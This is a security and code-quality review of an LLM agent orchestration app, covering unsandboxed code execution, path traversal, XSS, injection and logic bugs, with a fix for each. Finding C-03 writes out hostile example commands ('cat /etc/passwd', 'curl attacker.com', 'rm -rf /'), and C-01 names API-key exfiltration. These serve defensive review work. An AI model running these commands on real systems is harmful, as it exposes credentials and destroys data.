# Runbook Code Review

Comprehensive code review conducted 2026-03-03 covering all backend services, routers, models, agents, frontend components, and project configuration.

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Critical Findings](#critical-findings)
3. [Important Findings](#important-findings)
4. [Minor Findings](#minor-findings)
5. [Recommendations](#recommendations)

---

## Executive Summary

| Severity | Count |
|----------|-------|
| Critical | 12 |
| Important | 40 |
| Minor | 30+ |

The codebase is well-structured with clean separation of concerns, but has significant security gaps — primarily around **unsandboxed code execution**, **path traversal**, and **information leakage**. The architecture is sound for an MVP but needs hardening before any shared or production deployment.

**Top 3 risks:**
1. Unsandboxed code execution (code runner, bash tool, dynamic agent loading via `exec()`)
2. Path traversal and information leakage (artifact serving, storage_path in API responses)
3. Logic bugs in the executor that can mark valid actions as failed or destroy completed work during replanning

---

## Critical Findings

### C-01: Unsandboxed Code Execution (code_runner.py)
- **File:** `backend/app/services/code_runner.py:282-329`
- **Impact:** LLM-generated Python runs as the backend user with full filesystem, network, and env var access
- **Risk:** Credential exfiltration (`os.environ['OPENAI_API_KEY']`), data destruction, reverse shells
- **Fix:** Run code in Docker containers with `--network none`, resource limits, read-only filesystem, stripped env vars. At minimum use `nsjail` or `bubblewrap`.

### C-02: Arbitrary Code via Dynamic Agent Loading (registry.py)
- **File:** `backend/app/services/agents/registry.py:100-141`
- **Impact:** `exec()` with full `__builtins__` on DB-stored agent code — anyone who can write to `agent_definitions` gets RCE
- **Fix:** Restrict `__builtins__` (remove `__import__`, `exec`, `eval`, `open`), or run custom agents in sandboxed subprocesses

### C-03: Coding Agent bash Tool Has No Restrictions (coding_tools.py)
- **File:** `backend/app/services/agents/coding_tools.py:207-248`
- **Impact:** LLM can run any shell command — `cat /etc/passwd`, `curl attacker.com`, `rm -rf /`
- **Fix:** Run bash inside the same sandbox as code execution. Add command allowlist at minimum.

### C-04: Path Traversal in Artifact Serving (artifacts.py)
- **File:** `backend/app/routers/artifacts.py:36-44`
- **Impact:** `storage_path` from DB served via `FileResponse` with no validation — can read any file on server
- **Fix:** Validate resolved path is within `ARTIFACTS_DIR`:
```python
resolved = Path(artifact.storage_path).resolve()
if not str(resolved).startswith(str(ARTIFACTS_ROOT)):
    raise HTTPException(403, "Access denied")
```

### C-05: Unauthenticated Code Execution Endpoint (tasks.py)
- **File:** `backend/app/routers/tasks.py:250-386`
- **Impact:** `POST /run-code` accepts arbitrary Python with no auth, no rate limiting
- **Fix:** Add rate limiting, require confirmation nonce, or restrict to task-output-only code

### C-06: storage_path Exposed in API Response (schemas/task.py)
- **File:** `backend/app/schemas/task.py:50-61`
- **Impact:** `ArtifactResponse` includes `storage_path`, leaking internal server directory structure
- **Fix:** Remove `storage_path` from response schema, replace with `/artifacts/{id}/content` URL

### C-07: Action Incorrectly Marked "Failed" (executor.py)
- **File:** `backend/app/services/executor.py:112-115`
- **Impact:** When `all_completed=False` and `failed_tasks` is empty (tasks are pending/paused), action is marked failed
- **Fix:** Check for actually stuck state; don't mark failed if tasks are still pending or paused

### C-08: full_replan Deletes All Tasks Including Completed Ones (recovery_manager.py)
- **File:** `backend/app/services/recovery_manager.py:324-356`
- **Impact:** Deletes ALL tasks + cascades to TaskOutputs, Artifacts, Logs — destroys completed work
- **Fix:** Preserve completed tasks during replan, or archive/version outputs before deletion

### C-09: Unvalidated pip install (code_runner.py)
- **File:** `backend/app/services/code_runner.py:179-204`
- **Impact:** Package names from LLM-generated code installed into backend's own venv via `pip install`
- **Fix:** Install into isolated venv per task, maintain package allowlist

### C-10: XSS via dangerouslySetInnerHTML (diff-viewer.tsx)
- **File:** `frontend/src/components/workspace/diff-viewer.tsx:71`
- **Impact:** diff2html output rendered without sanitization — crafted diffs could inject scripts
- **Fix:** `DOMPurify.sanitize(htmlContent)` before passing to `dangerouslySetInnerHTML`

### C-11: LIKE Wildcard Injection (actions.py, templates.py)
- **File:** `backend/app/routers/actions.py:93-97`, `backend/app/routers/templates.py:81-85`
- **Impact:** Search parameter injected into LIKE pattern without escaping `%` and `_` — character-by-character data enumeration
- **Fix:** Escape LIKE special characters:
```python
escaped = re.sub(r'([%_\\])', r'\\\1', search)
```

### C-12: LLM Usage Not Tracked for Planner/Recovery Calls (llm_client.py)
- **File:** `backend/app/services/llm_client.py:416-454`
- **Impact:** `chat_completion_with_tool` never calls `_record_llm_usage` — planner and recovery costs completely untracked
- **Fix:** Add usage recording to the tool-call path

---

## Important Findings

### Security

| # | File | Issue |
|---|------|-------|
| I-01 | `routers/planner_config.py:180` | Exception details leaked in HTTP 500 responses (may include API keys) |
| I-02 | `schemas/task.py:32` | `workspace_path` exposed in TaskResponse |
| I-03 | `services/mcp_client.py:87` | All backend env vars (API keys) passed to MCP server subprocesses |
| I-04 | `services/agents/data_retrieval_agent.py:268-289` | SSRF risk — fetches arbitrary URLs from LLM, no internal IP blocking |
| I-05 | `services/agents/code_execution_agent.py:111` | Auto-install of arbitrary pip packages (related to C-09) |
| I-06 | `services/code_runner.py:352-353` | No path traversal protection on task_id/action_id in work dir |
| I-07 | `services/code_runner.py:166-176` | `_is_installed` uses `__import__` causing side effects — use `importlib.util.find_spec` |

### Logic Bugs

| # | File | Issue |
|---|------|-------|
| I-08 | `services/executor.py:362-368` | `InputUnavailableError` incorrectly triggers recovery loop instead of requeueing as pending |
| I-09 | `services/recovery_manager.py:309-319` | "Dependency failed" reset may reset tasks whose root cause is unfixed |
| I-10 | `services/dag_scheduler.py:117-121` | Crashed task runners leave tasks in "running" forever — DAG loop never completes |
| I-11 | `services/dag_scheduler.py:78-121` | No timeout on outer DAG loop — infinite loop risk |
| I-12 | `services/llm_client.py:501-528` | kwargs mutated by `pop()` — usage tracking broken for fallback models |
| I-13 | `services/artifact_versioning.py:116-138` | Version numbering resets after artifact deletion |
| I-14 | `routers/agent_memory.py:90-121` | Race condition creating new memory (concurrent requests, no IntegrityError catch) |
| I-15 | `routers/agent_skills.py:185-198` | Returns 201 for existing concepts (should be 200 or 409) |
| I-16 | `routers/agent_skills.py:129-142` | Redundant duplicate query in delete_skill |

### Performance

| # | File | Issue |
|---|------|-------|
| I-17 | `services/executor.py:244-269` | N+1 query in `_gather_dep_outputs` (2 queries per dependency) |
| I-18 | `services/dag_scheduler.py:93-101` | Per-task commit inside loop instead of batched |
| I-19 | `services/artifact_versioning.py:50-51` | Blocking `shutil.copy2` in async code |
| I-20 | `services/scheduler.py:134-176` | Polling loop (360 queries/action) instead of event-driven completion tracking |
| I-21 | `services/agents/coding_agent.py:689` | New HTTP client created per iteration (up to 50x) — no connection reuse |

### Missing Timeouts

| # | File | Issue |
|---|------|-------|
| I-22 | Multiple agent files | No per-call timeout on LLM API calls |
| I-23 | `services/mcp_client.py:146-173` | MCP tool calls have no timeout |

### Configuration

| # | File | Issue |
|---|------|-------|
| I-24 | `services/planner.py:149-188` | `max_tasks` config loaded but never enforced |
| I-25 | Multiple files | Hardcoded `localhost:8001` artifact URLs (will break in any deployment) |
| I-26 | `routers/actions.py:79` | No upper bound on `limit` parameter |
| I-27 | `schemas/action.py:9` | No min-length validation on `root_prompt` (empty strings accepted) |
| I-28 | `routers/analytics.py:17` | No validation on `days` parameter (accepts negative) |
| I-29 | `routers/analytics.py:37` | `group_concat` is SQLite-specific |
| I-30 | `services/scheduler.py:67-131` | No locking for concurrent scheduler instances |

### Data Integrity

| # | File | Issue |
|---|------|-------|
| I-31 | `models/artifact_version.py:14` | Missing FK on `artifact_id` |
| I-32 | `models/agent_memory_model.py:25` | Missing FK on `memory_id` |
| I-33 | `models/llm_usage.py:14-15` | Missing FKs and indexes on `action_id`, `task_id` |
| I-34 | `models/tool_usage.py:16-17` | Missing FKs and indexes on lookup columns |
| I-35 | Multiple models | Missing indexes on frequently queried columns (Action.status, updated_at, parent_action_id, forked_from_id) |

### Frontend

| # | File | Issue |
|---|------|-------|
| I-36 | `hooks/use-action-events.ts:34-275` | SSE event data cast with `as` without runtime validation |
| I-37 | `components/workspace/task-logs-drawer.tsx:44-46` | Log dedup based on message content only (can hide legitimate duplicates) |
| I-38 | `app/page.tsx:15-23` | createAction failure unhandled — no error display |
| I-39 | `app/schedules/page.tsx:175-176` | `isRunning` shared across all schedule rows |
| I-40 | `app/templates/page.tsx:174` | `isUsing` shared across all template cards |
| I-41 | `hooks/use-action-events.ts:102-103` | `action.replanning` clears cost data |
| I-42 | `app/actions/[id]/page.tsx:23-25` | `resetForAction("")` race condition on rapid navigation |
| I-43 | `components/workspace/pause-guidance-panel.tsx:20-21` | Pause/resume silently swallow API errors |

### Fire-and-Forget Tasks

| # | File | Issue |
|---|------|-------|
| I-44 | Multiple routers and services | `asyncio.create_task()` without stored references or error callbacks — exceptions silently lost |

---

## Minor Findings

### Backend
- `event_bus.py:62` — `80%%` in f-string displays double percent
- `dag_scheduler.py:39-42` — BFS uses `list.pop(0)` (O(n)) instead of `deque.popleft()` (O(1))
- `recovery_manager.py:359-424` — `transform_to_acquisition` appears to be dead code
- `planner.py:161` — `max_retries` naming ambiguous (retries vs attempts)
- `skill_capture.py` — Three functions with identical structure (duplication)
- `skill_capture.py:31,53,77` — Exception details not logged in error handlers
- `llm_client.py:446-448` — Remaining kwargs silently ignored in Anthropic path
- `code_runner.py:221-256` — Fragile `plt.show()` replacement logic
- Deprecated `asyncio.get_event_loop()` in arxiv_search_agent.py and data_retrieval_agent.py
- ArxivSearchAgent missing error handling on some LLM calls
- Report agent image injection logic compares section index against image count incorrectly
- SubActionAgent event forwarding can silently die on timeout
- Spreadsheet agent logs inside DB session (SQLite deadlock risk)
- Message array grows unbounded in agentic loops (coding_agent, mcp_agent)
- `models/action_schedule.py` and `models/action_template.py` — no `onupdate` on `updated_at`
- `models/skill_relation.py:33` — `properties` stored as Text not JSON column
- `models/action_template.py:17` — `tags` stored as Text not JSON column
- `routers/schedules.py:109` — Schedule-action linkage via fragile title string matching
- `schemas/planner_config.py:27-28` — `max_tasks`/`max_retries` accept zero/negative
- `schemas/task.py:18` — `timeout_seconds` accepts negative
- No enum validation on skill category/priority/source, agent definition status

### Frontend
- `app/agents/[id]/page.tsx:133-137` — handleDelete missing error handling
- `app/skills/page.tsx:937` — Skills page ignores `agent_type` URL param
- `components/workspace/workspace-header.tsx:184-206` — Forks dropdown no outside-click handler
- `components/workspace/workspace-header.tsx:253-297` — Cost panel no outside-click handler
- `components/workspace/task-card.tsx:95` — TaskCard selects entire overrides map (O(n) re-renders)
- `lib/api.ts:7-9` — Content-Type set on GET/DELETE requests
- `lib/api.ts:21` — 204 returns `undefined as T` (type unsoundness)
- `stores/action-store.ts:108-117` — `appendTaskLog` creates new object per log entry

### Project Config
- `.gitignore` missing `*.db-shm` globally; inconsistent WAL/SHM coverage
- `backend/actions.db-shm` tracked in git from first commit
- `.env.example` only documents 2 of 6+ environment variables
- CORS allows all methods and headers (`*`)
- `NEXT_PUBLIC_API_URL` env var undocumented
- No migration tool (ALTER TABLE with bare `except pass`)
- `test_action.py` tracked in repo root (appears to be one-off script)

---

## Recommendations

### Priority 1: Security Hardening (before any shared deployment)

1. **Sandbox all code execution** — Run `code_runner.py` scripts, coding agent bash commands, and dynamic agents in Docker containers or `nsjail` with:
   - No network access to internal services
   - Stripped environment variables (especially API keys)
   - Read-only filesystem except for designated output directory
   - Resource limits (CPU, memory, disk)
   - Unprivileged user

2. **Fix path traversal** — Validate all `storage_path` values resolve within `ARTIFACTS_DIR` before serving

3. **Remove internal paths from API responses** — Strip `storage_path` and `workspace_path` from response schemas

4. **Sanitize HTML output** — Add DOMPurify to diff viewer, consider rehype-sanitize for markdown rendering

5. **Escape LIKE wildcards** in search parameters

6. **Add rate limiting** to code execution endpoint

### Priority 2: Critical Logic Fixes

7. **Fix executor "failed" marking** — Don't mark action failed when tasks are pending/paused
8. **Fix full_replan data loss** — Preserve or archive completed task outputs
9. **Add LLM usage tracking** to `chat_completion_with_tool`
10. **Fix kwargs mutation** in utility_completion chain for proper fallback tracking

### Priority 3: Robustness

11. **Add timeouts** to all LLM API calls and MCP tool calls
12. **Add DAG loop timeout** to prevent infinite polling on stuck tasks
13. **Fix fire-and-forget tasks** — Add error callbacks or use a helper wrapper
14. **Add foreign keys** to artifact_version, agent_memory, llm_usage, tool_usage
15. **Add indexes** on frequently queried columns
16. **Batch N+1 queries** in `_gather_dep_outputs`
17. **Make artifact URLs configurable** — Replace hardcoded `localhost:8001`

### Priority 4: Frontend Improvements

18. **Add runtime validation** to SSE event data
19. **Fix shared isPending state** in schedules and templates pages
20. **Add error handling** to createAction, pauseTask, deleteAgent
21. **Fix resetForAction race condition** on rapid navigation
22. **Preserve cost data** during replanning
